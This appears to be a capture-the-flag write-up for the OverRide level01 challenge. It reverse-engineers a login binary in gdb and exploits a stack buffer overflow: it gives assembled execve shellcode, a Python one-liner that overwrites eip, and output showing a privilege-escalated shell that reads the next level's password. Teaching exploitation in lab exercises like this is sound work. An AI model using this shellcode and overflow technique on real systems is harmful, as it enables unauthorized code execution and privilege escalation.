# level1 - Stack Buffer Overflow


On `level1`'s HOME, we find a binary named : `level1`

```shell
...
0x08048464  verify_user_name
0x080484a3  verify_user_pass
0x080484d0  main
...
```

let's disassemble these functions:

```shell
(gdb)  disass main
Dump of assembler code for function main:
   0x080484d0 <+0>:	push   ebp
   0x080484d1 <+1>:	mov    ebp,esp
   0x080484d3 <+3>:	push   edi
   0x080484d4 <+4>:	push   ebx
   0x080484d5 <+5>:	and    esp,0xfffffff0
   0x080484d8 <+8>:	sub    esp,0x60
   0x080484db <+11>:	lea    ebx,[esp+0x1c]
   0x080484df <+15>:	mov    eax,0x0
   0x080484e4 <+20>:	mov    edx,0x10
   0x080484e9 <+25>:	mov    edi,ebx
   0x080484eb <+27>:	mov    ecx,edx
   0x080484ed <+29>:	rep stos DWORD PTR es:[edi],eax
   0x080484ef <+31>:	mov    DWORD PTR [esp+0x5c],0x0
   0x080484f7 <+39>:	mov    DWORD PTR [esp],0x80486b8
   0x080484fe <+46>:	call   0x8048380 <puts@plt>
   0x08048503 <+51>:	mov    eax,0x80486df
   0x08048508 <+56>:	mov    DWORD PTR [esp],eax
   0x0804850b <+59>:	call   0x8048360 <printf@plt>
   0x08048510 <+64>:	mov    eax,ds:0x804a020
   0x08048515 <+69>:	mov    DWORD PTR [esp+0x8],eax
   0x08048519 <+73>:	mov    DWORD PTR [esp+0x4],0x100
   0x08048521 <+81>:	mov    DWORD PTR [esp],0x804a040
   0x08048528 <+88>:	call   0x8048370 <fgets@plt>
   0x0804852d <+93>:	call   0x8048464 <verify_user_name>
   0x08048532 <+98>:	mov    DWORD PTR [esp+0x5c],eax
   0x08048536 <+102>:	cmp    DWORD PTR [esp+0x5c],0x0
   0x0804853b <+107>:	je     0x8048550 <main+128>
   0x0804853d <+109>:	mov    DWORD PTR [esp],0x80486f0
   0x08048544 <+116>:	call   0x8048380 <puts@plt>
   0x08048549 <+121>:	mov    eax,0x1
   0x0804854e <+126>:	jmp    0x80485af <main+223>
   0x08048550 <+128>:	mov    DWORD PTR [esp],0x804870d
   0x08048557 <+135>:	call   0x8048380 <puts@plt>
   0x0804855c <+140>:	mov    eax,ds:0x804a020
   0x08048561 <+145>:	mov    DWORD PTR [esp+0x8],eax
   0x08048565 <+149>:	mov    DWORD PTR [esp+0x4],0x64
   0x0804856d <+157>:	lea    eax,[esp+0x1c]
   0x08048571 <+161>:	mov    DWORD PTR [esp],eax
   0x08048574 <+164>:	call   0x8048370 <fgets@plt>
   0x08048579 <+169>:	lea    eax,[esp+0x1c]
   0x0804857d <+173>:	mov    DWORD PTR [esp],eax
   0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
   0x08048585 <+181>:	mov    DWORD PTR [esp+0x5c],eax
   0x08048589 <+185>:	cmp    DWORD PTR [esp+0x5c],0x0
   0x0804858e <+190>:	je     0x8048597 <main+199>
   0x08048590 <+192>:	cmp    DWORD PTR [esp+0x5c],0x0
   0x08048595 <+197>:	je     0x80485aa <main+218>
   0x08048597 <+199>:	mov    DWORD PTR [esp],0x804871e
   0x0804859e <+206>:	call   0x8048380 <puts@plt>
   0x080485a3 <+211>:	mov    eax,0x1
   0x080485a8 <+216>:	jmp    0x80485af <main+223>
   0x080485aa <+218>:	mov    eax,0x0
   0x080485af <+223>:	lea    esp,[ebp-0x8]
   0x080485b2 <+226>:	pop    ebx
   0x080485b3 <+227>:	pop    edi
   0x080485b4 <+228>:	pop    ebp
   0x080485b5 <+229>:	ret
End of assembler dump.
(gdb)  disass verify_user_name
Dump of assembler code for function verify_user_name:
   0x08048464 <+0>:	push   ebp
   0x08048465 <+1>:	mov    ebp,esp
   0x08048467 <+3>:	push   edi
   0x08048468 <+4>:	push   esi
   0x08048469 <+5>:	sub    esp,0x10
   0x0804846c <+8>:	mov    DWORD PTR [esp],0x8048690
   0x08048473 <+15>:	call   0x8048380 <puts@plt>
   0x08048478 <+20>:	mov    edx,0x804a040
   0x0804847d <+25>:	mov    eax,0x80486a8
   0x08048482 <+30>:	mov    ecx,0x7
   0x08048487 <+35>:	mov    esi,edx
   0x08048489 <+37>:	mov    edi,eax
   0x0804848b <+39>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x0804848d <+41>:	seta   dl
   0x08048490 <+44>:	setb   al
   0x08048493 <+47>:	mov    ecx,edx
   0x08048495 <+49>:	sub    cl,al
   0x08048497 <+51>:	mov    eax,ecx
   0x08048499 <+53>:	movsx  eax,al
   0x0804849c <+56>:	add    esp,0x10
   0x0804849f <+59>:	pop    esi
   0x080484a0 <+60>:	pop    edi
   0x080484a1 <+61>:	pop    ebp
   0x080484a2 <+62>:	ret
End of assembler dump.
(gdb) disass verify_user_pass
Dump of assembler code for function verify_user_pass:
   0x080484a3 <+0>:	push   ebp
   0x080484a4 <+1>:	mov    ebp,esp
   0x080484a6 <+3>:	push   edi
   0x080484a7 <+4>:	push   esi
   0x080484a8 <+5>:	mov    eax,DWORD PTR [ebp+0x8]
   0x080484ab <+8>:	mov    edx,eax
   0x080484ad <+10>:	mov    eax,0x80486b0
   0x080484b2 <+15>:	mov    ecx,0x5
   0x080484b7 <+20>:	mov    esi,edx
   0x080484b9 <+22>:	mov    edi,eax
   0x080484bb <+24>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080484bd <+26>:	seta   dl
   0x080484c0 <+29>:	setb   al
   0x080484c3 <+32>:	mov    ecx,edx
   0x080484c5 <+34>:	sub    cl,al
   0x080484c7 <+36>:	mov    eax,ecx
   0x080484c9 <+38>:	movsx  eax,al
   0x080484cc <+41>:	pop    esi
   0x080484cd <+42>:	pop    edi
   0x080484ce <+43>:	pop    ebp
   0x080484cf <+44>:	ret
End of assembler dump.
```

<br>

After decompiling it using gdb, we build this code in C language:

```shell
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char g_buffer[256];

int verify_user_name() {

	puts("verifying username....");
	return strncmp("dat_wil", g_buffer, 7);

}

int verify_user_pass(char *password) {

	return strncmp("admin", password, 5);

}


int main(void) {

	char buffer[60];

	for (int i = 0; i < 60; i++) {
		buffer[i] = '\0';
	}

	puts("********* ADMIN LOGIN PROMPT *********");
	printf("Enter Username: ");
	fgets(g_buffer, 256, stdin);

	if (verify_user_name() == 0) {
		puts("Enter Password: ");
		fgets(buffer, 100, stdin);

		if (verify_user_pass(buffer) == 0) {
			puts("nope, incorrect password...");
			return 1;
		}

	} else {
		puts("nope, incorrect username...");
		return 1;
	}

	return 0;


}

```

<br>

We understand that there are two input string:

1. The seven first bytes of the first string is comparing to "dat_wil".

2. The five first bytes of the second is comparing to "admin".

Although the first match allows you to enter the second string. The
second correspondence does not allow you to exploit this binary (shell,
pass, etc.)

<br>

But the second entrance is vulnerable to overflow. In fact, you can put
up to 100 characters in a buffer of 60! Let's check the distance between
`g_buffer` and `eip`:

```shell
(gdb) b *0x08048528
Breakpoint 1 at 0x8048528
(gdb) r
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********

Breakpoint 1, 0x08048528 in main ()
(gdb) x/x $esp+0x1c
0xffffd5cc:	0x00000000
(gdb) info frame
Stack level 0, frame at 0xffffd620:
 eip = 0x8048528 in main; saved eip 0xf7e45513
 Arglist at 0xffffd618, args: 
 Locals at 0xffffd618, Previous frame's sp is 0xffffd620
 Saved registers:
  ebx at 0xffffd610, ebp at 0xffffd618, edi at 0xffffd614, eip at 0xffffd61c

```

The distance between them is from **80 bytes** (*ffffd61c â€“ ffffd5cc = 50*).
Perfect we can rewrite `eip` after an offset of 80 bytes.

<br>

We now know that we can redirect execution, but where? In the first input!
In fact, the space available on the first input string is 256 bytes, much longer
than the length of the string: "dat_wil". From the assembler code, we know the
target address: *0x804a040*. All we need to do is add 7 bytes (the length of the
user name) and concatenate our shellcode.


<br>

This is our crafted shellcode (on our machine) from this snippet:
```shell
execve('/bin//sh')
```

```shell
>$ cat /tmp/exploit01.s
global _start

section .text
_start:
    xor eax, eax        ; set eax to 0
    xor ecx, ecx        ; value to NULL to prevent misbehavior
    xor edx, edx        ; value to NULL to prevent misbehavior
    mov al, 11          ; execve syscall number
    push edx            ; push NULL string terminator
    mov ebx, '//sh'     ; first arg to /sh
    push ebx            ; push to stack
    mov ebx, '/bin'     ; first arg to /bin/sh
    push ebx            ; push to stack
    mov ebx, esp        ; move pointer to '/bin//sh'
    int    0x80         ; syscall
```

After compile it, let's extract the shellcode (on our machine):
```shell
(cd /tmp && nasm -f elf exploit01.s && ld -m elf_i386 -o exploit01 exploit01.o)
count=0; for i in $(objdump -d /tmp/exploit01 |grep "^ " |cut -f2); do echo -n "\x$i"; count=$((count + 1)); done; echo; echo "$count bytes"
```

We get now our shellcode in well form with his length:
```shell
[SNIP]
\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80
25 bytes
```

<br>


To summary, we have two payloads to build:

**First:**

- the username : *'dat_wil'*
- our shellcode

**Second:**

- an offset of 80 characters
- the address where first payload is stored + 0x7 : *0x0804a047* 

<br>


We can now exploit this BOF :

```shell
(python -c 'print "dat_wil" + "\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80"'; python -c 'print "A" * 80 + "\x08\x04\xa0\x47"[::-1]'; cat) | ./level01
```
```shell
level01@OverRide:~$ (python -c 'print "dat_wil" + "\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80"'; python -c 'print "A" * 80 + "\x08\x04\xa0\x47"[::-1]'; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

id
uid=1001(level01) gid=1001(level01) euid=1002(level02) egid=100(users) groups=1002(level02),100(users),1001(level01)
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

Perfect, we got the `level02`'s password !
